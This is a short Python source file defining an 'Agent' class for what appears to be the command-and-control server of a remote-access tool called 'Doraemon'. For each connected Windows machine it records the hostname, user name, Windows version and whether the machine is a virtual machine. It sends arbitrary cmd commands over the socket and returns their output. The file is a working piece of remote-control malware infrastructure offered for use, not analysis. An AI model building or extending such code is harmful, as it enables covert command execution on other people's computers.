from socket import socket
import uuid


BUFF_SIZE = 2048


class Agent:
    ## Agent constructor
    def __init__(self, socket: socket, address, data):
        # set self properties
        self._socket = socket
        self._address = address

        # agent's uuid
        self._uuid = uuid.uuid4()

        # agent's properties
        self._hostname: str = data['hostname']
        self._username: str = data['username']
        self._winVersion: str = data['winVersion']
        self._isVM: bool = data['isVM']


    ## display agent
    def display(self) -> str:
        agent_host = "PC" if not self._isVM else "VM"
        return f"Doraemon Agent {str(self._uuid)} at {agent_host} - {self._hostname} ({self._address[0]}::{self._address[1]})\n\tRunning on user {self._username} with Windows version {self._winVersion}"

    ## execute cmd command
    def execute(self, command: str) -> str:
        self._socket.send(command.encode())
        commandOutput: str = self._socket.recv(BUFF_SIZE).decode()

        return commandOutput